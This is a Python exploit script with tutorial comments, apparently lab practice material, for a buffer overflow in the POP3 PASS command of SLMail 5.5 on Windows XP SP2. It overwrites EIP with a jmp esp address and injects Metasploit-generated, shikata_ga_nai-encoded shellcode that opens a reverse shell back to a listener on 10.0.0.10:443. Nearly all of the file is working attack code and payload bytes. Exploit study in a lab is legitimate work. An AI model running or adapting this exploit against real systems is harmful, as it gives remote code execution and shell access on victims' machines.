#!/usr/bin/env python
# cccgoe 02.06.2015 - buffer overflow exploitation basics
# injecting reverse tcp shell payload generated by metasploit
# make sure to have netcat listener running on IP 10.0.0.10 at port 443
# if the ip adresses differ it is required to generate a new payload
# or search the ip in the assembly and patch it manually ;)
# This is a working exploit for SLMail 5.5 on Windows XP SP2!

# import socket library
import socket

# AF_INET = IPv4, SOCK_STREAM = TCP, SOCK_DGREAM = UDP
# See http://openbook.galileocomputing.de/python/python_kapitel_20_001.htm
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

# padding to reach EIP offset
padding = 'A' * 2606

# overwrite saved EIP with address to jmp esp instruction in slmfc.dll at 5F4A358F ---little endian---> \x8f\x35\x4a\x5f
EIP = '\x8f\x35\x4a\x5f'

# place NOP's in exploit variable for demonstration purposes
nop = '\x90' * 10

# badchars = \x00\x0a\x0d
# \x00 = stringterminator
# \x0a = linefeed
# \x0f = carriage return

# msfvenom will create the payload and encode it to remove bad characters 
# using the polymorhpic encoder shikata_ga_nai which will create a uniqe 
# payload each time you call msfvenom

# msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=10.0.0.10 LPORT=443 -f py -e x86/shikata_ga_nai -b '\x00\x0a\x0d'
# FUNC=thread LHOST=10.0.0.10 LPORT=443 -f py -e x86/shikata_ga_nai -b '\x00\x0a\x0d'
# No platform was selected, choosing Msf::Module::Platform::Windows from the payload
# No Arch selected, selecting Arch: x86 from the payload
# Found 1 compatible encoders
# Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
# x86/shikata_ga_nai succeeded with size 351 (iteration=0)
buf =  ""
buf += "\xbb\x9c\x01\x33\xe2\xdb\xdd\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x52\x83\xe8\xfc\x31\x58\x0e\x03\xc4\x0f\xd1"
buf += "\x17\x08\xe7\x97\xd8\xf0\xf8\xf7\x51\x15\xc9\x37\x05"
buf += "\x5e\x7a\x88\x4d\x32\x77\x63\x03\xa6\x0c\x01\x8c\xc9"
buf += "\xa5\xac\xea\xe4\x36\x9c\xcf\x67\xb5\xdf\x03\x47\x84"
buf += "\x2f\x56\x86\xc1\x52\x9b\xda\x9a\x19\x0e\xca\xaf\x54"
buf += "\x93\x61\xe3\x79\x93\x96\xb4\x78\xb2\x09\xce\x22\x14"
buf += "\xa8\x03\x5f\x1d\xb2\x40\x5a\xd7\x49\xb2\x10\xe6\x9b"
buf += "\x8a\xd9\x45\xe2\x22\x28\x97\x23\x84\xd3\xe2\x5d\xf6"
buf += "\x6e\xf5\x9a\x84\xb4\x70\x38\x2e\x3e\x22\xe4\xce\x93"
buf += "\xb5\x6f\xdc\x58\xb1\x37\xc1\x5f\x16\x4c\xfd\xd4\x99"
buf += "\x82\x77\xae\xbd\x06\xd3\x74\xdf\x1f\xb9\xdb\xe0\x7f"
buf += "\x62\x83\x44\xf4\x8f\xd0\xf4\x57\xd8\x15\x35\x67\x18"
buf += "\x32\x4e\x14\x2a\x9d\xe4\xb2\x06\x56\x23\x45\x68\x4d"
buf += "\x93\xd9\x97\x6e\xe4\xf0\x53\x3a\xb4\x6a\x75\x43\x5f"
buf += "\x6a\x7a\x96\xf0\x3a\xd4\x49\xb1\xea\x94\x39\x59\xe0"
buf += "\x1a\x65\x79\x0b\xf1\x0e\x10\xf6\x92\x3a\xe5\xf8\x68"
buf += "\x53\xe7\xf8\x6d\x18\x6e\x1e\x07\x4e\x27\x89\xb0\xf7"
buf += "\x62\x41\x20\xf7\xb8\x2c\x62\x73\x4f\xd1\x2d\x74\x3a"
buf += "\xc1\xda\x74\x71\xbb\x4d\x8a\xaf\xd3\x12\x19\x34\x23"
buf += "\x5c\x02\xe3\x74\x09\xf4\xfa\x10\xa7\xaf\x54\x06\x3a"
buf += "\x29\x9e\x82\xe1\x8a\x21\x0b\x67\xb6\x05\x1b\xb1\x37"
buf += "\x02\x4f\x6d\x6e\xdc\x39\xcb\xd8\xae\x93\x85\xb7\x78"
buf += "\x73\x53\xf4\xba\x05\x5c\xd1\x4c\xe9\xed\x8c\x08\x16"
buf += "\xc1\x58\x9d\x6f\x3f\xf9\x62\xba\xfb\x19\x81\x6e\xf6"
buf += "\xb1\x1c\xfb\xbb\xdf\x9e\xd6\xf8\xd9\x1c\xd2\x80\x1d"
buf += "\x3c\x97\x85\x5a\xfa\x44\xf4\xf3\x6f\x6a\xab\xf4\xa5"

buffer = padding + EIP + nop + buf

# exception handler
try:
	print '\nSending buffer...'
	s.connect (('10.0.0.20',110))
	data=s.recv(1024)
	s.send('User test' + '\r\n')
	data=s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print '\n Done!'
except:
	print 'Could not connect to POP3!'


